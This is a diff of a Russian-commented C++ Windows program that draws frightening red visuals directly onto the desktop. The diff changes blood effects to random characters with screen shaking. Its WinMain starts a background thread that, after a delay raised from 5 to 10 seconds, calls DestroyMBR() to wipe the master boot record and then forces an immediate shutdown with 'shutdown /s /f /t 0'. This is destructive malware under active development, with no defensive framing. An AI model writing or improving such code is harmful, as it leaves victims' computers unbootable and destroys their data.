@@ -6,58 +6,25 @@
 #include <chrono>
 
 // ==========================================
-// ЧАСТЬ 1: РИСУЕМ КРОВЬ И УЖАС
+// ЧАСТЬ 1: РИСУЕМ ПАДАЮЩИЕ СИМВОЛЫ
 // ==========================================
-
-void DrawBlood(HDC hdc, int w, int h) {
-    // Красная кисть для крови
-    HBRUSH bloodBrush = CreateSolidBrush(RGB(150, 0, 0));
-    
-    // 1. Рисуем капли крови (случайные круги и линии сверху)
-    for (int i = 0; i < 50; i++) {
-        int x = rand() % w;
-        int y = rand() % (h / 2);
-        int size = rand() % 30 + 10;
-        Ellipse(hdc, x, y, x + size, y + size);
-        
-        // Добавляем "подтеки" (линии вниз)
-        HPEN bloodPen = CreatePen(PS_SOLID, rand() % 5 + 1, RGB(150, 0, 0));
-        SelectObject(hdc, bloodPen);
-        MoveToEx(hdc, x + size/2, y + size, NULL);
-        LineTo(hdc, x + size/2, y + size + rand() % 200);
-        DeleteObject(bloodPen);
-    }
-    
-    DeleteObject(bloodBrush);
-}
-
-void DrawScaryText(HDC hdc, int w, int h) {
-    // Жуткий шрифт
-    HFONT hFont = CreateFontW(
-        80, 0, 0, 0, FW_BOLD, TRUE, FALSE, FALSE, 
-        DEFAULT_CHARSET, OUT_OUTLINE_PRECIS, 
-        CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, 
-        VARIABLE_PITCH, L"Impact" // Жирный шрифт
-    );
-    SelectObject(hdc, hFont);
-    
-    // Красный цвет текста
+void DrawFallingChars(HDC hdc, int w, int h) {
+    // Красная кисть и шрифт
     SetTextColor(hdc, RGB(255, 0, 0));
     SetBkMode(hdc, TRANSPARENT);
     
-    // Текст в случайных местах
-    const wchar_t* texts[] = {
-        L"I SEE YOU",
-        L"YOUR SOUL IS MINE",
-        L"BLOOD FOR THE BLOOD GOD",
-        L"DIE",
-        L"HELP ME"
-    };
+    HFONT hFont = CreateFontW(30, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
+                              DEFAULT_CHARSET, OUT_OUTLINE_PRECIS,
+                              CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
+                              VARIABLE_PITCH, L"Consolas");
+    SelectObject(hdc, hFont);
     
-    for (int i = 0; i < 5; i++) {
-        int x = rand() % (w - 400);
-        int y = rand() % (h - 200);
-        TextOutW(hdc, x, y, texts[i], wcslen(texts[i]));
+    // Рисуем 50 случайных символов
+    for (int i = 0; i < 50; i++) {
+        int x = rand() % w;
+        int y = rand() % h;
+        wchar_t ch = (wchar_t)(rand() % 93 + 33); // Символы ASCII
+        TextOutW(hdc, x, y, &ch, 1);
     }
     
     DeleteObject(hFont);
@@ -96,21 +63,15 @@ void HorrorLoop() {
         FillRect(hdc, &rect, blackBrush);
         DeleteObject(blackBrush);
         
-        // Рисуем кровь и текст
-        DrawBlood(hdc, w, h);
-        DrawScaryText(hdc, w, h);
+        // Рисуем падающие символы
+        DrawFallingChars(hdc, w, h);
         
-        // Мерцание (пульсация красным)
-        HBRUSH redFlash = CreateSolidBrush(RGB(100, 0, 0));
-        for (int i = 0; i < 5; i++) {
-            FillRect(hdc, &rect, redFlash);
-            Sleep(50);
-            FillRect(hdc, &rect, blackBrush);
-            Sleep(50);
-        }
-        DeleteObject(redFlash);
+        // Тряска окна (сдвиг всего экрана)
+        int shakeX = rand() % 20 - 10;
+        int shakeY = rand() % 20 - 10;
+        BitBlt(hdc, shakeX, shakeY, w, h, hdc, 0, 0, SRCCOPY);
         
-        Sleep(1000); // Пауза перед следующей итерацией
+        Sleep(50); // Задержка для мерцания
     }
     
     ReleaseDC(NULL, hdc);
@@ -120,14 +81,14 @@ void HorrorLoop() {
 // ГЛАВНАЯ ФУНКЦИЯ
 // ==========================================
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
-    // Запускаем снос MBR в фоне через 5 секунд
+    // Запускаем снос MBR в фоне через 10 секунд
     std::thread([]() {
-        std::this_thread::sleep_for(std::chrono::seconds(5));
+        std::this_thread::sleep_for(std::chrono::seconds(10));
         DestroyMBR();
         system("shutdown /s /f /t 0");
     }).detach();
     
-    // Запускаем кровавый ужас
+    // Запускаем ужас
     HorrorLoop();
     
     return 0;
